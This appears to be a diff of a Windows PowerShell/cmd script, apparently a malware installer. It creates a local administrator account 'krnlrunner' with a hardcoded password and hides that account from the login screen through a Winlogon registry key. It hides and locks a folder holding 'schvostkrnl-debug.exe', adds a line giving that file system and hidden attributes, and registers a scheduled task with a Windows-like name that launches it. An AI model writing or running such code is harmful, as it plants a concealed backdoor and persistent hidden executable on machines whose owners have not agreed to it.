@@ -14,21 +14,24 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name Creati
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
 
 
-net user krnlrunner "StrongPassword123!" /add;
 
-net localgroup Administrators krnlrunner /add;
+net user krnlrunner "StrongPass123!" /add /y
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f;
+net localgroup Administrators krnlrunner /add
 
-icacls "C:\Users\Public\krnl" /inheritance:r;
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f
 
-icacls "C:\Users\Public\krnl" /remove "Users";
 
-icacls "C:\Users\Public\krnl" /remove "Everyone";
+icacls "C:\Users\Public\krnl" /inheritance:r
 
-icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F";
+icacls "C:\Users\Public\krnl" /remove "Users"
 
-Start-Process "cmd.exe" -Credential (New-Object System.Management.Automation.PSCredential("krnlrunner", (ConvertTo-SecureString "StrongPassword123!" -AsPlainText -Force))) -ArgumentList "/c exit"
+icacls "C:\Users\Public\krnl" /remove "Everyone"
+
+icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
+
+attrib +s +h "C:\Users\Public\krnl\schvostkrnl-debug.exe"
+
 
 Register-ScheduledTask -TaskName "WINschvostkrnl" `
   -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") `
